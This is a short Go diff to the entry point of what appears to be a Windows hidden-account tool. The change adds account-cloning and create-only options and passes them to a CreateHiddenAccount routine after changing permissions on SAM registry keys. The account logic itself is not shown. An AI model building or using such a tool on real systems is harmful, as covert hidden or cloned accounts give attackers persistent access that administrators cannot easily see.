@@ -10,19 +10,17 @@ import (
 )
 
 func main() {
-	username, password, deleteusername, check := common.Flag()
+	username, password, deleteusername, cloneuser, onlycreate, check := common.Flag()
 	common.DetermineRegistryPermissions("SAM\\SAM")
 	common.DetermineRegistryPermissions("SAM\\SAM\\Domains")
 	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account")
 	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users")
 	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users\\Names")
-	common.DetermineRegistryPermissions("SAM\\SAM\\Domains\\Account\\Users\\Names\\Administrator")
-
 	if check {
 		core.CheckHiddenAccounts()
 	} else if deleteusername != "" {
 		core.DeleteHiddenAccount(deleteusername)
 	} else {
-		core.CreateHiddenAccount(username, password)
+		core.CreateHiddenAccount(username, password, cloneuser, onlycreate)
 	}
 }
